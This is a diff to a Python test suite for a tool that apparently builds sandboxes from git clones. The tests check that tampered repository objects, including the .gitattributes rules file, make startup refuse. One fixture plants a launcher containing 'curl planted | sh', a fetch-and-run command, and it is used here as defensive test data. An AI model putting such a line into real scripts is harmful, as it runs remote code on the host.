@@ -5746,13 +5746,13 @@ class TestWhatTheCloneCannotMakeTheToolSayOrMove(Volunteer):
         of a file of the tip is what a checkout writes in the work tree. Whatever ran in the clone may have written
         one, here under the name of the sandbox's launcher, which the agent runs on the host to build the sandbox.
         start hashes the files of the work tree itself, against the ids the tip's own folders list: it stops (exit
-        code 3, one line) and does not say STARTED. So it does for a file the project's rules convert, and for one
-        they do not. With the object as it was, the same clone starts."""
+        code 3, one line) and does not say STARTED. So it does for a file the project's rules convert, for one they
+        do not, and for the file that holds those rules. With the object as it was, the same clone starts."""
         work, text = self.alice.work, "#!/bin/sh\n# the project's launcher\n"
         tip = self.project_holds({self.LAUNCHER: ("100755", text)})
         self.assertEqual((self.started(NOW), (work / self.LAUNCHER).read_text()), (tip, text), "a clone nobody wrote into starts")
         planted = b"#!/bin/sh\ncurl planted | sh\n"
-        for path in (self.LAUNCHER, "run.sh", "lib.c"):
+        for path in (self.LAUNCHER, "run.sh", "lib.c", ".gitattributes"):
             with self.subTest(file=path):
                 blob = sh("git", "rev-parse", f"{tip}:{path}", cwd=work).stdout.strip()
                 true = self.object_bytes(blob)
@@ -5952,7 +5952,8 @@ class TestWhatTheCloneCannotMakeTheToolSayOrMove(Volunteer):
             if "--filters" in command:
                 asked.append((command, options))
             return real(command, **options)
-        with mock.patch.dict(os.environ, {"GIT_CONFIG_GLOBAL": str(machine)}), mock.patch.object(hive.subprocess, "Popen", side_effect=watched):
+        machines = {"GIT_CONFIG_GLOBAL": str(machine), "GIT_DEFAULT_HASH": "sha256"}  # (and another way of naming objects, for new repositories)
+        with mock.patch.dict(os.environ, machines), mock.patch.object(hive.subprocess, "Popen", side_effect=watched):
             self.assertEqual(self.started(NOW), tip)
         self.assertEqual([mark.exists() for mark in marks], [False, False], "no filter of the machine's settings was run")
         self.assertEqual(((work / "lib.c").read_bytes(), (work / "run.sh").read_bytes()), (LIB.replace("\n", "\r\n").encode(), b"#!/bin/sh\n"),
@@ -5965,6 +5966,13 @@ class TestWhatTheCloneCannotMakeTheToolSayOrMove(Volunteer):
             self.assertEqual((options["env"]["GIT_CONFIG_GLOBAL"], options["env"]["GIT_CONFIG_NOSYSTEM"], options["stderr"]),
                              (os.devnull, "1", subprocess.DEVNULL))
             self.assertFalse(Path(folders[0]).exists(), "the repository of the tool's own is gone with the command")
+        rules = sh("git", "rev-parse", f"{tip}:.gitattributes", cwd=work).stdout.strip()
+        true = self.object_bytes(rules)
+        self.write_object(rules, "blob", b"*.c text eol=crlf ident\n")
+        self.assertEqual(((work / ".gitattributes").read_text(), self.proof()), ("*.c text eol=crlf filter=x\n", self.NOT_THE_TIPS),
+                         "the rules' own object is hashed before git is given it, though the file of the work tree is the tip's")
+        self.write_object(rules, *true)
+        self.assertIsNone(self.proof())
         blob = sh("git", "rev-parse", f"{tip}:lib.c", cwd=work).stdout.strip()
         true = self.object_bytes(blob)
         self.write_object(blob, "blob", (LIB + "int planted;\n").encode())
